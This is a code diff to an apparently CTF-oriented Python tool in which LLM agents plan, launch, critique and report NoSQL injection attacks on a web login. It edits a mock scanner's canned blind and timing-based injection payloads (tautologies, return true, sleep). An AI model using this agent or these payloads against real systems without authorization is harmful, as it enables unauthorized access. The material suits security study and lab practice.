@@ -42,34 +42,40 @@ class ScanForNoSQLITool(BaseTool):
 Found Blind NoSQL Injection:
         URL: {url}
         param:
-        Injection: =true:  || 'a'=='a' || 'a'=='a, false: ";return false;"
+        Injection: =true: ';return true;'}}]//, false: "';return false;'}}//"
 ''',
             f'''
 Found Blind NoSQL Injection:
         URL: {url}
         param:
-        Injection: =true:  && 'a'=='a' && 'a'=='a, false: ";return false;"
+        Injection: =true: ' || 'a'=='a' || 'a'=='a, false: "' && 'a'!='a' && 'a'!='a"
 ''',
             f'''
 Found Blind NoSQL Injection:
         URL: {url}
         param:
-        Injection: =true: ;return true;//, false: " && 'a'!='a' && 'a'!='a//"
+        Injection: =true: ';return true;', false: "';return false;'"
 ''',
             f'''
 Found Blind NoSQL Injection:
         URL: {url}
         param:
-        Injection: =true: ;return true;, false: " && 'a'!='a' && 'a'!='a"
+        Injection: =true: ' || 'a'=='a' || 'a'=='a//, false: "' && 'a'!='a' && 'a'!='a//"
 ''',
             f'''
 Found Timing based NoSQL Injection:
         URL: {url}
         param:
-        Injection: =true:  && 'a'=='a' && 'a'=='a//, false: ";return false;//"
-''']
+        Injection: ="';sleep(500);'"
+''',
+            f'''
+Found Timing based NoSQL Injection:
+        URL: {url}
+        param:
+        Injection: ="';sleep(500);'}}//"
+'''
+        ]
 
-        # get the current result and increment counter
         result = res[0:self._state % len(res)+1]
         result = '\n'.join(result)
         self._state += 1
@@ -80,8 +86,8 @@ Found Timing based NoSQL Injection:
         return await asyncio.to_thread(self._run, url, fields)
 
 
-if len(sys.argv) < 3:
-    print("Usage: python main.py <url> <model>")
+if len(sys.argv) < 4:
+    print("Usage: python main.py <url> <model> <goal>")
     sys.exit(1)
 
 
@@ -112,6 +118,7 @@ async def main():
 
     url = sys.argv[1]
     MODEL = sys.argv[2]
+    # goal = sys.argv[3]
 
 
     goal = "login with username 'admin' using nosql injection and retrieve ctf flag"
@@ -119,7 +126,7 @@ async def main():
     print("[*] Fetching initial website scrape...")
     website_scrape = fetch_initial_scrape(url)
 
-    # Define extended state for full workflow
+    # workflow state
     class FullPentestState(TypedDict):
         url: str
         goal: str
@@ -138,7 +145,6 @@ async def main():
     async def scanner_input_structurer(state: FullPentestState):
         """Structure scanner inputs directly from website scrape."""
         
-        # Build the prompt with context
         prompt = f"""
 You are a Scanner Input Structurer analyzing a website to determine NoSQL injection scanner inputs.
 
@@ -276,7 +282,7 @@ Return the endpoint URL and 5 payloads.
                 result = {
                     "payload": payload_obj,
                     "status_code": response.status_code,
-                    "response_body": response.text,  # Truncate for safety
+                    "response_body": response.text, 
                     "success": response.status_code == 200
                 }
                 
@@ -395,12 +401,11 @@ Using the attempt history and the confirmed successful payload, produce a concis
 No Additional text.
 """
         
-        # For report, we can use dict as schema to allow free-form structure
         result = await call_ollama_with_json(
             MODEL,
             prompt,
-            dict,  # Allow free-form report structure
-            print_output=False  # Don't use default pretty print for reports
+            dict, 
+            print_output=False  
         )
         
         print("\n=== FINAL REPORT GENERATED ===")
@@ -418,13 +423,12 @@ No Additional text.
             return "planner_agent"
         elif decision == "success":
             return "report_writer"
-        else:  # failure or max iterations
+        else:  
             return END
 
-    # Build the workflow graph
     graph = StateGraph(FullPentestState)
     
-    # Add all nodes
+    # add all nodes
     graph.add_node("scanner_input_structurer", scanner_input_structurer)
     graph.add_node("manual_scanner", manual_scanner)
     graph.add_node("planner_agent", planner_agent)
@@ -432,14 +436,14 @@ No Additional text.
     graph.add_node("critic_agent", critic_agent)
     graph.add_node("report_writer", report_writer_agent)
 
-    # Define edges
+    # edges
     graph.add_edge(START, "scanner_input_structurer")
     graph.add_edge("scanner_input_structurer", "manual_scanner")
     graph.add_edge("manual_scanner", "planner_agent")
     graph.add_edge("planner_agent", "attacker_agent")
     graph.add_edge("attacker_agent", "critic_agent")
     
-    # Conditional routing after critic
+    # conditional routing after critic
     graph.add_conditional_edges(
         "critic_agent",
         route_after_critic,
@@ -476,6 +480,8 @@ No Additional text.
             
         }
     )
+
+    # calculate and output time taken for data collection
 
     end_time = time.perf_counter()
 
